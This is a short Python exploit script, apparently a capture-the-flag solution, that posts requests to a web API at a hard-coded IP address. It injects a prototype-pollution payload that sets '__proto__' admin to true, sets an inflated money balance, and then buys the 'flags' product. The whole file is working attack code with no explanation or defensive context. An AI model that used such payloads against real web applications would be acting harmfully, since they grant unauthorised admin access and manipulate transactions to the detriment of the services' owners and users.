import requests

def req_post(api,postData):
    headers = {'content-type': 'application/json'}
    url = "http://206.189.236.145:3000/" + api
    res = session.post(url=url, headers=headers, data=postData)
    return res.text

if __name__ == "__main__":
    session = requests.session()
    print(req_post('api/v1/sell','{"__proto__":{"admin": true}}'))
    print(req_post('api/v1/money','{"money": 2.5e+25}'))
    print(req_post('api/v1/buy','{"product":"flags","quantity":1}'))